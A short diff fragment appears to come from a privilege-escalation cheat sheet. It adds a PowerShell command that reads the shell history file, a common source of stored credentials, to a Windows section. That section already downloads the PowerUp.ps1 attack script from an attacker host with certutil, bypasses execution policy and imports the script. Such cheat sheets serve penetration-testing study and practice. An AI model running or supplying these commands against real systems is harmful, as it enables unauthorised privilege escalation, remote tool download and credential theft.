@@ -79,6 +79,7 @@ cat /etc/*release
 ### Windows
 ```bash
 whoami /priv
+Get-Content (Get-PSReadLineOption).HistorySavePath
 certutil.exe -urlcache -split -f "http://$myip:8000/PowerUp.ps1" pu.ps1
 powershell -ep bypass
 Import-Module .\pu.ps1
